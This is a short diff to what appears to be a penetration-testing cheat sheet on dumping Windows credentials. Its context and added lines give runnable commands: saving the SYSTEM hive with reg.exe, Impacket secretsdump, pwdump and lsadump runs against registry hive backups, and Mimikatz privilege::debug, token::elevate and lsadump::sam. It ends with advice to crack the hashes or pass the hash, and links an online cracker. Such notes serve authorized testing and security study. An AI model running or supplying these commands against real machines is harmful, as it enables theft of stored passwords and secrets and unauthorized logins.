@@ -292,12 +292,20 @@ Manually:
      reg.exe save HKLM\SYSTEM system.bak 
      *transfer files to attack box then dump* 
      python3 /usr/local/bin/secretsdump.py -sam sam.bak -system system.bak LOCAL 
+     
+     #dump local passwords with Impacket
+     pwdump.py sys_backup.hiv sec_backup.hiv
+     
+     #dump LSA secrets with Impacket
+     lsadump.py sys_backup.hiv sec_backup.hiv
+
 
 Mimikatz: 
 
      privilege::debug 
      token::elevate 
      lsadump::sam  
+     
      
 *then crack hashes or use pass the hash to login* 
 [Online hash cracker](https://crackstation.net/) 
